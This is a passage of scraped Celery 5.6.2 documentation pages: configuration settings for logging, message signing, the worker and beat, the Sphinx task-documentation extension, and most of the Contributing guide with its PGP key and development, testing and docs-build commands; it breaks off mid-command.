by the Celery apps.\n\nworker_log_format\n\nDefault:\n\n\"[%(asctime)s: %(levelname)s/%(processName)s] %(message)s\"\n\n\nThe format to use for log messages.\n\nSee the Python logging module for more information about log formats.\n\nworker_task_log_format\n\nDefault:\n\n\"[%(asctime)s: %(levelname)s/%(processName)s]\n    %(task_name)s[%(task_id)s]: %(message)s\"\n\n\nThe format to use for log messages logged in tasks.\n\nSee the Python logging module for more information about log formats.\n\nworker_redirect_stdouts\n\nDefault: Enabled by default.\n\nIf enabled stdout and stderr will be redirected to the current logger.\n\nUsed by celery worker and celery beat.\n\nworker_redirect_stdouts_level\n\nDefault: WARNING.\n\nThe log level output to stdout and stderr is logged as. Can be one of DEBUG, INFO, WARNING, ERROR, or CRITICAL.\n\nSecurity\nsecurity_key\n\nDefault: None.\n\nAdded in version 2.5.\n\nThe relative or absolute path to a file containing the private key used to sign messages when Message Signing is used.\n\nsecurity_key_password\n\nDefault: None.\n\nAdded in version 5.3.0.\n\nThe password used to decrypt the private key when Message Signing is used.\n\nsecurity_certificate\n\nDefault: None.\n\nAdded in version 2.5.\n\nThe relative or absolute path to an X.509 certificate file used to sign messages when Message Signing is used.\n\nsecurity_cert_store\n\nDefault: None.\n\nAdded in version 2.5.\n\nThe directory containing X.509 certificates used for Message Signing. Can be a glob with wild-cards, (for example /etc/certs/*.pem).\n\nsecurity_digest\n\nDefault: sha256.\n\nAdded in version 4.3.\n\nA cryptography digest used to sign messages when Message Signing is used. https://cryptography.io/en/latest/hazmat/primitives/cryptographic-hashes/#module-cryptography.hazmat.primitives.hashes\n\nCustom Component Classes (advanced)\nworker_pool\n\nDefault: \"prefork\" (celery.concurrency.prefork:TaskPool).\n\nName of the pool class used by the worker.\n\nEventlet/Gevent\n\nNever use this option to select the eventlet or gevent pool. You must use the -P option to celery worker instead, to ensure the monkey patches aren’t applied too late, causing things to break in strange ways.\n\nworker_pool_restarts\n\nDefault: Disabled by default.\n\nIf enabled the worker pool can be restarted using the pool_restart remote control command.\n\nworker_autoscaler\n\nAdded in version 2.2.\n\nDefault: \"celery.worker.autoscale:Autoscaler\".\n\nName of the autoscaler class to use.\n\nworker_consumer\n\nDefault: \"celery.worker.consumer:Consumer\".\n\nName of the consumer class used by the worker.\n\nworker_timer\n\nDefault: \"kombu.asynchronous.hub.timer:Timer\".\n\nName of the ETA scheduler class used by the worker. Default is or set by the pool implementation.\n\nworker_logfile\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional file path for celery worker to log into (defaults to stdout).\n\nworker_pidfile\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional file path for celery worker to create/store its PID file (defaults to no PID file created).\n\nworker_uid\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional user ID to use when celery worker daemon drops its privileges (defaults to no UID change).\n\nworker_gid\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional group ID to use when celery worker daemon drops its privileges (defaults to no GID change).\n\nworker_umask\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional umask to use when celery worker creates files (log, pid…) when daemonizing.\n\nworker_executable\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional python executable path for celery worker to use when deaemonizing (defaults to sys.executable).\n\nBeat Settings (celery beat)\nbeat_schedule\n\nDefault: {} (empty mapping).\n\nThe periodic task schedule used by beat. See Entries.\n\nbeat_scheduler\n\nDefault: \"celery.beat:PersistentScheduler\".\n\nThe default scheduler class. May be set to \"django_celery_beat.schedulers:DatabaseScheduler\" for instance, if used alongside https://pypi.org/project/django-celery-beat/ extension.\n\nCan also be set via the celery beat -S argument.\n\nbeat_schedule_filename\n\nDefault: \"celerybeat-schedule\".\n\nName of the file used by PersistentScheduler to store the last run times of periodic tasks. Can be a relative or absolute path, but be aware that the suffix .db may be appended to the file name (depending on Python version).\n\nCan also be set via the celery beat --schedule argument.\n\nbeat_sync_every\n\nDefault: 0.\n\nThe number of periodic tasks that can be called before another database sync is issued. A value of 0 (default) means sync based on timing - default of 3 minutes as determined by scheduler.sync_every. If set to 1, beat will call sync after every task message sent.\n\nbeat_max_loop_interval\n\nDefault: 0.\n\nThe maximum number of seconds beat can sleep between checking the schedule.\n\nThe default for this value is scheduler specific. For the default Celery beat scheduler the value is 300 (5 minutes), but for the https://pypi.org/project/django-celery-beat/ database scheduler it’s 5 seconds because the schedule may be changed externally, and so it must take changes to the schedule into account.\n\nAlso when running Celery beat embedded (-B) on Jython as a thread the max interval is overridden and set to 1 so that it’s possible to shut down in a timely manner.\n\nbeat_cron_starting_deadline\n\nAdded in version 5.3.\n\nDefault: None.\n\nWhen using cron, the number of seconds beat can look back when deciding whether a cron schedule is due. When set to None, cronjobs that are past due will always run immediately.\n\nWarning\n\nSetting this higher than 3600 (1 hour) is highly discouraged.\n\nbeat_logfile\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional file path for celery beat to log into (defaults to stdout).\n\nbeat_pidfile\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional file path for celery beat to create/store it PID file (defaults to no PID file created).\n\nbeat_uid\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional user ID to use when beat celery beat drops its privileges (defaults to no UID change).\n\nbeat_gid\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional group ID to use when celery beat daemon drops its privileges (defaults to no GID change).\n\nbeat_umask\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional umask to use when celery beat creates files (log, pid…) when daemonizing.\n\nbeat_executable\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional python executable path for celery beat to use when deaemonizing (defaults to sys.executable).\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nExtensions and Bootsteps\n\nNext topic\n\nDocumenting Tasks with Sphinx\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Configuration and defaults\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491585,
    "timestamp": "2026-02-23T00:13:49.391Z",
    "title": "Django — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/django/index.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Django\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nDjango\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nFirst steps with Django\nUsing Celery with Django\nExtensions\nStarting the worker process\nWhere to go from here\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nDocumenting Tasks with Sphinx\n\nNext topic\n\nFirst steps with Django\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Django\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491584,
    "timestamp": "2026-02-23T00:13:49.393Z",
    "title": "Documenting Tasks with Sphinx — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/sphinx.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Documenting Tasks with Sphinx\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nDocumenting Tasks with Sphinx\n\nThis document describes how auto-generate documentation for Tasks using Sphinx.\n\ncelery.contrib.sphinx\n\nSphinx documentation plugin used to document tasks.\n\nIntroduction\nUsage\n\nThe Celery extension for Sphinx requires Sphinx 2.0 or later.\n\nAdd the extension to your docs/conf.py configuration module:\n\nextensions = (...,\n              'celery.contrib.sphinx')\n\n\nIf you’d like to change the prefix for tasks in reference documentation then you can change the celery_task_prefix configuration value:\n\ncelery_task_prefix = '(task)'  # < default\n\n\nWith the extension installed autodoc will automatically find task decorated objects (e.g. when using the automodule directive) and generate the correct (as well as add a (task) prefix), and you can also refer to the tasks using :task:proj.tasks.add syntax.\n\nUse .. autotask:: to alternatively manually document a task.\n\nSphinx 9.0+ Compatibility\n\nSphinx 9.0 introduced a rewritten autodoc implementation. The Celery extension requires the legacy class-based autodoc mode to function correctly. When using Sphinx 9.0 or later, add the following to your conf.py:\n\nautodoc_use_legacy_class_based = True\n\n\nThe extension will automatically enable this setting if not configured, but it is recommended to set it explicitly to avoid warnings.\n\nclass celery.contrib.sphinx.TaskDirective(name, arguments, options, content, lineno, content_offset, block_text, state, state_machine)\n[source]\n\nSphinx task directive.\n\nget_signature_prefix(sig)\n[source]\n\nMay return a prefix to put before the object name in the signature.\n\nclass celery.contrib.sphinx.TaskDocumenter(directive: DocumenterBridge, name: str, indent: str = '')\n[source]\n\nDocument task definitions.\n\nclassmethod can_document_member(member, membername, isattr, parent)\n[source]\n\nCalled to see if a member can be documented by this Documenter.\n\ncheck_module()\n[source]\n\nCheck if self.object is really defined in the module given by self.modname.\n\ndocument_members(all_members=False)\n[source]\n\nGenerate reST for member documentation.\n\nIf all_members is True, document all members, else those given by self.options.members.\n\nformat_args()\n[source]\n\nFormat the argument signature of self.object.\n\nShould return None if the object does not have a signature.\n\nmember_order = 11\n\norder if autodoc_member_order is set to ‘groupwise’\n\nobjtype = 'task'\n\nname by which the directive is called (auto…) and the default generated directive name\n\ncelery.contrib.sphinx.autodoc_skip_member_handler(app, what, name, obj, skip, options)\n[source]\n\nHandler for autodoc-skip-member event.\n\ncelery.contrib.sphinx.setup(app)\n[source]\n\nSetup Sphinx extension.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nConfiguration and defaults\n\nNext topic\n\nDjango\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Documenting Tasks with Sphinx\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491586,
    "timestamp": "2026-02-23T00:13:49.407Z",
    "title": "Contributing — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/contributing.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Contributing\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nContributing\n\nWelcome!\n\nThis document is fairly extensive and you aren’t really expected to study this in detail for small contributions;\n\nThe most important rule is that contributing must be easy and that the community is friendly and not nitpicking on details, such as coding style.\n\nIf you’re reporting a bug you should read the Reporting bugs section below to ensure that your bug report contains enough information to successfully diagnose the issue, and if you’re contributing code you should try to mimic the conventions you see surrounding the code you’re working on, but in the end all patches will be cleaned up by the person merging the changes so don’t worry too much.\n\nCommunity Code of Conduct\n\nBe considerate\n\nBe respectful\n\nBe collaborative\n\nWhen you disagree, consult others\n\nWhen you’re unsure, ask for help\n\nStep down considerately\n\nReporting Bugs\n\nSecurity\n\nOther bugs\n\nIssue Trackers\n\nContributors guide to the code base\n\nVersions\n\nBranches\n\ndev branch\n\nMaintenance branches\n\nArchived branches\n\nFeature branches\n\nTags\n\nWorking on Features & Patches\n\nForking and setting up the repository\n\nDeveloping and Testing with Docker\n\nRunning the unit test suite\n\nCalculating test coverage\n\nCode coverage in HTML format\n\nCode coverage in XML (Cobertura-style)\n\nRunning the tests on all supported Python versions\n\nBuilding the documentation\n\nBuild the documentation using Docker\n\nVerifying your contribution\n\npyflakes & PEP-8\n\nAPI reference\n\nIsort\n\nCreating pull requests\n\nStatus Labels\n\nCoding Style\n\nContributing features requiring additional libraries\n\nContacts\n\nCommitters\n\nAsk Solem\n\nAsif Saif Uddin\n\nDmitry Malinovsky\n\nIonel Cristian Mărieș\n\nMher Movsisyan\n\nOmer Katz\n\nSteeve Morin\n\nJosue Balandrano Coronel\n\nTomer Nosrati\n\nWebsite\n\nMauro Rocco\n\nJan Henrik Helmers\n\nPackages\n\ncelery\n\nkombu\n\namqp\n\nvine\n\npytest-celery\n\nbilliard\n\ndjango-celery-beat\n\ndjango-celery-results\n\nlibrabbitmq\n\ncell\n\ncyme\n\nDeprecated\n\nRelease Procedure\n\nUpdating the version number\n\nReleasing\n\nCommunity Code of Conduct\n\nThe goal is to maintain a diverse community that’s pleasant for everyone. That’s why we would greatly appreciate it if everyone contributing to and interacting with the community also followed this Code of Conduct.\n\nThe Code of Conduct covers our behavior as members of the community, in any forum, mailing list, wiki, website, Internet relay chat (IRC), public meeting or private correspondence.\n\nThe Code of Conduct is heavily based on the Ubuntu Code of Conduct, and the Pylons Code of Conduct.\n\nBe considerate\n\nYour work will be used by other people, and you in turn will depend on the work of others. Any decision you take will affect users and colleagues, and we expect you to take those consequences into account when making decisions. Even if it’s not obvious at the time, our contributions to Celery will impact the work of others. For example, changes to code, infrastructure, policy, documentation and translations during a release may negatively impact others’ work.\n\nBe respectful\n\nThe Celery community and its members treat one another with respect. Everyone can make a valuable contribution to Celery. We may not always agree, but disagreement is no excuse for poor behavior and poor manners. We might all experience some frustration now and then, but we cannot allow that frustration to turn into a personal attack. It’s important to remember that a community where people feel uncomfortable or threatened isn’t a productive one. We expect members of the Celery community to be respectful when dealing with other contributors as well as with people outside the Celery project and with users of Celery.\n\nBe collaborative\n\nCollaboration is central to Celery and to the larger free software community. We should always be open to collaboration. Your work should be done transparently and patches from Celery should be given back to the community when they’re made, not just when the distribution releases. If you wish to work on new code for existing upstream projects, at least keep those projects informed of your ideas and progress. It many not be possible to get consensus from upstream, or even from your colleagues about the correct implementation for an idea, so don’t feel obliged to have that agreement before you begin, but at least keep the outside world informed of your work, and publish your work in a way that allows outsiders to test, discuss, and contribute to your efforts.\n\nWhen you disagree, consult others\n\nDisagreements, both political and technical, happen all the time and the Celery community is no exception. It’s important that we resolve disagreements and differing views constructively and with the help of the community and community process. If you really want to go a different way, then we encourage you to make a derivative distribution or alternate set of packages that still build on the work we’ve done to utilize as common of a core as possible.\n\nWhen you’re unsure, ask for help\n\nNobody knows everything, and nobody is expected to be perfect. Asking questions avoids many problems down the road, and so questions are encouraged. Those who are asked questions should be responsive and helpful. However, when asking a question, care must be taken to do so in an appropriate forum.\n\nStep down considerately\n\nDevelopers on every project come and go and Celery is no different. When you leave or disengage from the project, in whole or in part, we ask that you do so in a way that minimizes disruption to the project. This means you should tell people you’re leaving and take the proper steps to ensure that others can pick up where you left off.\n\nReporting Bugs\nSecurity\n\nYou must never report security related issues, vulnerabilities or bugs including sensitive information to the bug tracker, or elsewhere in public. Instead sensitive bugs must be sent by email to security@celeryproject.org.\n\nIf you’d like to submit the information encrypted our PGP key is:\n\n-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v1.4.15 (Darwin)\n\nmQENBFJpWDkBCADFIc9/Fpgse4owLNvsTC7GYfnJL19XO0hnL99sPx+DPbfr+cSE\n9wiU+Wp2TfUX7pCLEGrODiEP6ZCZbgtiPgId+JYvMxpP6GXbjiIlHRw1EQNH8RlX\ncVxy3rQfVv8PGGiJuyBBjxzvETHW25htVAZ5TI1+CkxmuyyEYqgZN2fNd0wEU19D\n+c10G1gSECbCQTCbacLSzdpngAt1Gkrc96r7wGHBBSvDaGDD2pFSkVuTLMbIRrVp\nlnKOPMsUijiip2EMr2DvfuXiUIUvaqInTPNWkDynLoh69ib5xC19CSVLONjkKBsr\nPe+qAY29liBatatpXsydY7GIUzyBT3MzgMJlABEBAAG0MUNlbGVyeSBTZWN1cml0\neSBUZWFtIDxzZWN1cml0eUBjZWxlcnlwcm9qZWN0Lm9yZz6JATgEEwECACIFAlJp\nWDkCGwMGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJEOArFOUDCicIw1IH/26f\nCViDC7/P13jr+srRdjAsWvQztia9HmTlY8cUnbmkR9w6b6j3F2ayw8VhkyFWgYEJ\nwtPBv8mHKADiVSFARS+0yGsfCkia5wDSQuIv6XqRlIrXUyqJbmF4NUFTyCZYoh+C\nZiQpN9xGhFPr5QDlMx2izWg1rvWlG1jY2Es1v/xED3AeCOB1eUGvRe/uJHKjGv7J\nrj0pFcptZX+WDF22AN235WYwgJM6TrNfSu8sv8vNAQOVnsKcgsqhuwomSGsOfMQj\nLFzIn95MKBBU1G5wOs7JtwiV9jefGqJGBO2FAvOVbvPdK/saSnB+7K36dQcIHqms\n5hU4Xj0RIJiod5idlRC5AQ0EUmlYOQEIAJs8OwHMkrdcvy9kk2HBVbdqhgAREMKy\ngmphDp7prRL9FqSY/dKpCbG0u82zyJypdb7QiaQ5pfPzPpQcd2dIcohkkh7G3E+e\nhS2L9AXHpwR26/PzMBXyr2iNnNc4vTksHvGVDxzFnRpka6vbI/hrrZmYNYh9EAiv\nuhE54b3/XhXwFgHjZXb9i8hgJ3nsO0pRwvUAM1bRGMbvf8e9F+kqgV0yWYNnh6QL\n4Vpl1+epqp2RKPHyNQftbQyrAHXT9kQF9pPlx013MKYaFTADscuAp4T3dy7xmiwS\ncrqMbZLzfrxfFOsNxTUGE5vmJCcm+mybAtRo4aV6ACohAO9NevMx8pUAEQEAAYkB\nHwQYAQIACQUCUmlYOQIbDAAKCRDgKxTlAwonCNFbB/9esir/f7TufE+isNqErzR/\naZKZo2WzZR9c75kbqo6J6DYuUHe6xI0OZ2qZ60iABDEZAiNXGulysFLCiPdatQ8x\n8zt3DF9BMkEck54ZvAjpNSern6zfZb1jPYWZq3TKxlTs/GuCgBAuV4i5vDTZ7xK/\naF+OFY5zN7ciZHkqLgMiTZ+RhqRcK6FhVBP/Y7d9NlBOcDBTxxE1ZO1ute6n7guJ\nciw4hfoRk8qNN19szZuq3UU64zpkM2sBsIFM9tGF2FADRxiOaOWZHmIyVZriPFqW\nRUwjSjs7jBVNq0Vy4fCu/5+e+XLOUBOoqtM5W7ELt0t1w9tXebtPEetV86in8fU2\n=0chn\n-----END PGP PUBLIC KEY BLOCK-----\n\nOther bugs\n\nBugs can always be described to the mailing-list, but the best way to report an issue and to ensure a timely response is to use the issue tracker.\n\nCreate a GitHub account.\n\nYou need to create a GitHub account to be able to create new issues and participate in the discussion.\n\nDetermine if your bug is really a bug.\n\nYou shouldn’t file a bug if you’re requesting support. For that you can use the mailing-list, or irc-channel. If you still need support you can open a github issue, please prepend the title with [QUESTION].\n\nMake sure your bug hasn’t already been reported.\n\nSearch through the appropriate Issue tracker. If a bug like yours was found, check if you have new information that could be reported to help the developers fix the bug.\n\nCheck if you’re using the latest version.\n\nA bug could be fixed by some other improvements and fixes - it might not have an existing report in the bug tracker. Make sure you’re using the latest releases of celery, billiard, kombu, amqp, and vine.\n\nCollect information about the bug.\n\nTo have the best chance of having a bug fixed, we need to be able to easily reproduce the conditions that caused it. Most of the time this information will be from a Python traceback message, though some bugs might be in design, spelling or other errors on the website/docs/code.\n\nIf the error is from a Python traceback, include it in the bug report.\n\nWe also need to know what platform you’re running (Windows, macOS, Linux, etc.), the version of your Python interpreter, and the version of Celery, and related packages that you were running when the bug occurred.\n\nIf you’re reporting a race condition or a deadlock, tracebacks can be hard to get or might not be that useful. Try to inspect the process to get more diagnostic data. Some ideas:\n\nEnable Celery’s breakpoint signal and use it to inspect the process’s state. This will allow you to open a pdb session.\n\nCollect tracing data using strace`_(Linux), :command:`dtruss (macOS), and ktrace (BSD), ltrace, and lsof.\n\nInclude the output from the celery report command:\n\n$ celery -A proj report\n\n\nThis will also include your configuration settings and it will try to remove values for keys known to be sensitive, but make sure you also verify the information before submitting so that it doesn’t contain confidential information like API tokens and authentication credentials.\n\nYour issue might be tagged as Needs Test Case. A test case represents all the details needed to reproduce what your issue is reporting. A test case can be some minimal code that reproduces the issue or detailed instructions and configuration values that reproduces said issue.\n\nSubmit the bug.\n\nBy default GitHub will email you to let you know when new comments have been made on your bug. In the event you’ve turned this feature off, you should check back on occasion to ensure you don’t miss any questions a developer trying to fix the bug might ask.\n\nIssue Trackers\n\nBugs for a package in the Celery ecosystem should be reported to the relevant issue tracker.\n\nhttps://pypi.org/project/celery/: https://github.com/celery/celery/issues/\n\nhttps://pypi.org/project/kombu/: https://github.com/celery/kombu/issues\n\nhttps://pypi.org/project/amqp/: https://github.com/celery/py-amqp/issues\n\nhttps://pypi.org/project/vine/: https://github.com/celery/vine/issues\n\nhttps://pypi.org/project/pytest-celery/: https://github.com/celery/pytest-celery/issues\n\nhttps://pypi.org/project/librabbitmq/: https://github.com/celery/librabbitmq/issues\n\nhttps://pypi.org/project/django-celery-beat/: https://github.com/celery/django-celery-beat/issues\n\nhttps://pypi.org/project/django-celery-results/: https://github.com/celery/django-celery-results/issues\n\nIf you’re unsure of the origin of the bug you can ask the mailing-list, or just use the Celery issue tracker.\n\nContributors guide to the code base\n\nThere’s a separate section for internal details, including details about the code base and a style guide.\n\nRead Contributors Guide to the Code for more!\n\nVersions\n\nVersion numbers consists of a major version, minor version and a release number. Since version 2.1.0 we use the versioning semantics described by SemVer: http://semver.org.\n\nStable releases are published at PyPI while development releases are only available in the GitHub git repository as tags. All version tags starts with “v”, so version 0.8.0 has the tag v0.8.0.\n\nBranches\n\nCurrent active version branches:\n\ndev (which git calls “main”) (https://github.com/celery/celery/tree/main)\n\n4.5 (https://github.com/celery/celery/tree/v4.5)\n\n3.1 (https://github.com/celery/celery/tree/3.1)\n\nYou can see the state of any branch by looking at the Changelog:\n\nhttps://github.com/celery/celery/blob/main/Changelog.rst\n\nIf the branch is in active development the topmost version info should contain meta-data like:\n\n4.3.0\n======\n:release-date: TBA\n:status: DEVELOPMENT\n:branch: dev (git calls this main)\n\n\nThe status field can be one of:\n\nPLANNING\n\nThe branch is currently experimental and in the planning stage.\n\nDEVELOPMENT\n\nThe branch is in active development, but the test suite should be passing and the product should be working and possible for users to test.\n\nFROZEN\n\nThe branch is frozen, and no more features will be accepted. When a branch is frozen the focus is on testing the version as much as possible before it is released.\n\ndev branch\n\nThe dev branch (called “main” by git), is where development of the next version happens.\n\nMaintenance branches\n\nMaintenance branches are named after the version – for example, the maintenance branch for the 2.2.x series is named 2.2.\n\nPreviously these were named releaseXX-maint.\n\nThe versions we currently maintain is:\n\n4.2\n\nThis is the current series.\n\n4.1\n\nDrop support for python 2.6. Add support for python 3.4, 3.5 and 3.6.\n\n3.1\n\nOfficial support for python 2.6, 2.7 and 3.3, and also supported on PyPy.\n\nArchived branches\n\nArchived branches are kept for preserving history only, and theoretically someone could provide patches for these if they depend on a series that’s no longer officially supported.\n\nAn archived version is named X.Y-archived.\n\nTo maintain a cleaner history and drop compatibility to continue improving the project, we do not have any archived version right now.\n\nFeature branches\n\nMajor new features are worked on in dedicated branches. There’s no strict naming requirement for these branches.\n\nFeature branches are removed once they’ve been merged into a release branch.\n\nTags\n\nTags are used exclusively for tagging releases. A release tag is named with the format vX.Y.Z – for example v2.3.1.\n\nExperimental releases contain an additional identifier vX.Y.Z-id – for example v3.0.0-rc1.\n\nExperimental tags may be removed after the official release.\n\nWorking on Features & Patches\n\nNote\n\nContributing to Celery should be as simple as possible, so none of these steps should be considered mandatory.\n\nYou can even send in patches by email if that’s your preferred work method. We won’t like you any less, any contribution you make is always appreciated!\n\nHowever, following these steps may make maintainer’s life easier, and may mean that your changes will be accepted sooner.\n\nForking and setting up the repository\n\nFirst you need to fork the Celery repository; a good introduction to this is in the GitHub Guide: Fork a Repo.\n\nAfter you have cloned the repository, you should checkout your copy to a directory on your machine:\n\n$ git clone git@github.com:username/celery.git\n\n\nWhen the repository is cloned, enter the directory to set up easy access to upstream changes:\n\n$ cd celery\n$ git remote add upstream git@github.com:celery/celery.git\n$ git fetch upstream\n\n\nIf you need to pull in new changes from upstream you should always use the --rebase option to git pull:\n\ngit pull --rebase upstream main\n\n\nWith this option, you don’t clutter the history with merging commit notes. See Rebasing merge commits in git. If you want to learn more about rebasing, see the Rebase section in the GitHub guides.\n\nIf you need to work on a different branch than the one git calls main, you can fetch and checkout a remote branch like this:\n\ngit checkout --track -b 5.0-devel upstream/5.0-devel\n\n\nNote: Any feature or fix branch should be created from upstream/main.\n\nDeveloping and Testing with Docker\n\nBecause of the many components of Celery, such as a broker and backend, Docker and docker-compose can be utilized to greatly simplify the development and testing cycle. The Docker configuration here requires a Docker version of at least 17.13.0 and docker-compose 1.13.0+.\n\nThe Docker components can be found within the docker/ folder and the Docker image can be built via:\n\n$ docker compose build celery\n\n\nand run via:\n\n$ docker compose run --rm celery <command>\n\n\nwhere <command> is a command to execute in a Docker container. The –rm flag indicates that the container should be removed after it is exited and is useful to prevent accumulation of unwanted containers.\n\nSome useful commands to run:\n\nbash\n\nTo enter the Docker container like a normal shell\n\nmake test\n\nTo run the test suite. Note: This will run tests using python 3.12 by default.\n\ntox\n\nTo run tox and test against a variety of configurations. Note: This command will run tests for every environment defined in tox.ini. It takes a while.\n\npyenv exec python{3.8,3.9,3.10,3.11,3.12} -m pytest t/unit\n\nTo run unit tests using pytest.\n\nNote: {3.8,3.9,3.10,3.11,3.12} means you can use any of those options. e.g. pyenv exec python3.12 -m pytest t/unit\n\npyenv exec python{3.8,3.9,3.10,3.11,3.12} -m pytest t/integration\n\nTo run integration tests using pytest\n\nNote: {3.8,3.9,3.10,3.11,3.12} means you can use any of those options. e.g. pyenv exec python3.12 -m pytest t/unit\n\nBy default, docker-compose will mount the Celery and test folders in the Docker container, allowing code changes and testing to be immediately visible inside the Docker container. Environment variables, such as the broker and backend to use are also defined in the docker/docker-compose.yml file.\n\nBy running docker compose build celery an image will be created with the name celery/celery:dev. This docker image has every dependency needed for development installed. pyenv is used to install multiple python versions, the docker image offers python 3.8, 3.9, 3.10, 3.11 and 3.12. The default python version is set to 3.12.\n\nThe docker-compose.yml file defines the necessary environment variables to run integration tests. The celery service also mounts the codebase and sets the PYTHONPATH environment variable to /home/developer/celery. By setting PYTHONPATH the service allows to use the mounted codebase as global module for development. If you prefer, you can also run python -m pip install -e . to install the codebase in development mode.\n\nIf you would like to run a Django or stand alone project to manually test or debug a feature, you can use the image built by docker compose and mount your custom code. Here’s an example:\n\nAssuming a folder structure such as:\n\n+ celery_project\n  + celery # repository cloned here.\n  + my_project\n    - manage.py\n    + my_project\n      - views.py\n\nversion: \"3\"\n\nservices:\n    celery:\n        image: celery/celery:dev\n        environment:\n            TEST_BROKER: amqp://rabbit:5672\n            TEST_BACKEND: redis://redis\n         volumes:\n             - ../../celery:/home/developer/celery\n             - ../my_project:/home/developer/my_project\n         depends_on:\n             - rabbit\n             - redis\n     rabbit:\n         image: rabbitmq:latest\n     redis:\n         image: redis:latest\n\n\nIn the previous example, we are using the image that we can build from this repository and mounting the celery code base as well as our custom project.\n\nRunning the unit test suite\n\nIf you like to develop using virtual environments or just outside docker, you must make sure all necessary dependencies are installed. There are multiple requirements files to make it easier to install all dependencies. You do not have to use every requirements file but you must use default.txt.\n\n# pip install -U -r requirements/default.txt\n\n\nTo run the Celery test suite you need to install requirements/test.txt.\n\n$ pip install -U -r requirements/test.txt\n$ pip install -U -r requirements/default.txt\n\n\nAfter installing the dependencies required, you can now execute the test suite by calling pytest:\n\n$ pytest t/unit\n$ pytest t/integration\n\n\nSome useful options to pytest are:\n\n-x\n\nStop running the tests at the first test that fails.\n\n-s\n\nDon’t capture output\n\n-v\n\nRun with verbose output.\n\nIf you want to run the tests for a single test file only you can do so like this:\n\n$ pytest t/unit/worker/test_worker.py\n\nCalculating test coverage\n\nTo calculate test coverage you must first install the https://pypi.org/project/pytest-cov/ module.\n\nInstalling the https://pypi.org/project/pytest-cov/ module:\n\n$ pip install -U pytest-cov\n\nCode coverage in HTML format\n\nRun pytest with the --cov-report=html argument enabled:\n\n$ pytest --cov=celery --cov-report=html\n\n\nThe coverage output will then be located in the htmlcov/ directory:\n\n$ open htmlcov/index.html\n\nCode coverage in XML (Cobertura-style)\n\nRun pytest with the --cov-report=xml argument enabled:\n\n$ pytest --cov=celery --cov-report=xml\n\n\nThe coverage XML output will then be located in the coverage.xml file.\n\nRunning the tests on all supported Python versions\n\nThere’s a https://pypi.org/project/tox/ configuration file in the top directory of the distribution.\n\nTo run the tests for all supported Python versions simply execute:\n\n$ tox\n\n\nUse the tox -e option if you only want to test specific Python versions:\n\n$ tox -e 3.7\n\nBuilding the documentation\n\nTo build the documentation, you need to install the dependencies listed in requirements/docs.txt and requirements/default.txt:\n\n$ pip install -U -r requirements/docs.txt\n$ pip install -U -r requirements/default.txt\n\n\nAdditionally, to build with no warnings, you will need to install the following packages:\n\n$ apt-get install texlive texlive-latex-extra dvipng\n\n\nAfter these dependencies are installed, you should be able to build the docs by running:\n\n$ cd docs\n$ rm -rf _build\n$ make html\n\n\nMake sure there are no errors or warnings in the build output. After building succeeds, the documentation is available at _build/html.\n\nBuild the documentation using Docker\n\nBuild the documentation by running:\n\n$ docker compose -f docker/docker-compose.yml up --build docs\n\n\nThe service will start a local docs server at :7000. The server is using sphinx-autobuild with the --watch option enabled, so you can live edit the documentation. Check the additional options and configs in docker/docker-compose.yml\n\nVerifying your contribution\n\nTo use these tools, you need to install a few dependencies. These dependencies can be found in requirements/pkgutils.txt.\n\nInstalling the dependencies:\n\n$ pip install -U -r requirements/pkgutils.txt\n\npyflakes & PEP-8\n\nTo ensure that your changes conform to PEP 8 and to run pyflakes execute:\n\n$ make flakecheck\n\n\nTo not return a negative exit code when this command fails, use the flakes target instead:\n\n$ make flakes\n\nAPI reference\n\nTo make sure that all modules have a corresponding section in the API reference, please execute:\n\n$ make apicheck\n\n\nIf files are missing, you can add them by copying an existing reference file.\n\nIf the module is internal, it should be part of the internal reference located in docs/internals/reference/. If the module is public, it should be located in docs/reference/.\n\nFor example, if reference is missing for the module celery.worker.awesome and this module is considered part of the public API, use the following steps:\n\nUse an existing file as a template:\n\n$ cd docs/reference/\n$ cp celery.schedules.rst celery.worker.awesome.rst\n\n\nEdit the file using your favorite editor:\n\n$ vim celery.worker.awesome.rst\n\n    # change every occurrence of ``celery.schedules`` to\n    # ``celery.worker.awesome``\n\n\nEdit the index using your favorite editor:\n\n$ vim index.rst\n\n    # Add ``celery.worker.awesome`` to the index.\n\n\nCommit your changes:\n\n# Add the file to git\n$ git add celery.worker.awesome.rst\n$ git 